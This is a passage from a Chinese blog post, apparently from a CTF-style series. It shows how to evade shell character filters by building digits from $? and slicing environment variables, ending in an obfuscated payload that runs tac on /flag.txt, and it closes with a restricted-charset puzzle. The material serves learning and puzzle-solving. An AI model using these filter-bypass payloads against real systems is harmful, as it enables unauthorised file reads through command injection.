终止的命令</td></tr><tr><td>255</td><td>正常范围之内的退出状态码</td></tr></tbody></table><p>emm，”一般性未知错误“</p><p><img src="https://i.loli.net/2021/04/24/DBCWrJxRAa9ctny.png"></p><p>彳亍，那我们就有一个 1 了，不过 2 啥的还没找到咋搞，不过有一个 1 就够了，因为我们还有一个 <code>RANDOM</code> 环境变量可以利用：<code>&lt;A;echo $&#123;RANDOM:~A:$?&#125;</code>，介个样子就可以取到一位随机数了，很玄学的一个地方就是 <code>~A</code> 这个玩意儿似乎在 <code>$&#123;&#125;</code> 可以取到环境变量的最后一位的位置，利用这个点可以玩很多骚的</p><p><img src="https://i.loli.net/2021/04/24/xoP3ThNclKmziE2.png"></p><p>好了，随机个位数字也来了，我们只需要这样：<code>&lt;A;echo $&#123;SHELL::$&#123;RANDOM::$?&#125;&#125;</code>，随机到一个 5 就可以获得 <code>/bin/</code> 辣，那么怎么读文件呢，看了蛮久的 env 后发现，似乎用 tac 是最好的选择，因为最后一位的 t 蛮多的，比如 HOME，USER，MAIL（我的反正是）</p><p><img src="https://i.loli.net/2021/04/24/5SOdXyIuqklrJTm.png"></p><p>然后空格用 $IFS 随便过了，最后文件马马虎虎一个 <code>$&#123;PATH::$?&#125;????.???</code> 代替了 /flag.txt，最终 payload：<code>&lt;A;$&#123;SHELL::$&#123;RANDOM::$?&#125;&#125;$&#123;USER:~A:$?&#125;??$IFS$&#123;PATH::$?&#125;????.???</code></p><p>你别说，我还真读出来了奥</p><p><img src="https://i.loli.net/2021/04/24/PZC6YcRTd2xHIJu.jpg"></p><p>但是很奇怪的一点，就是 <code>/bin/t?? flag.txt</code> 的时候会出现前上图一大串奇怪的乱码，但是直接 <code>/bin/tac flag.txt</code> 不会</p><p><img src="https://i.loli.net/2021/04/24/JPpEVxyIgN9vFsR.png"></p><p>这一点不咋理解，但是无伤大雅</p><p>最后再来一个，我把 &lt; 或者 $? 过滤（就是这俩货连在一起就过滤）的话应该怎么办？</p><p>很简单，用 <code>SHIVL</code> 就 ok 了，SHIVL=1</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>这会想继续折磨一下大一新生，结合了一下前面的构造数字，应该挺简单的，不秒掉的话就要打PP</p><p>ok，现在抛出一个问题：现在👴试图读出 /flag.txt 文件，但是👴被限制了字符，只允许使用如下字符，怎解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ : &#123; &#125; ( ) #</span><br><span class="line">A D E F H I L M N O P R T S U</span><br></pre></td></tr></table></figure><p><del>先不写了，👴也还没仔细想，只是觉得这样可以出，这周末课设，太烦了，睡了</del></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 奇技淫巧 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
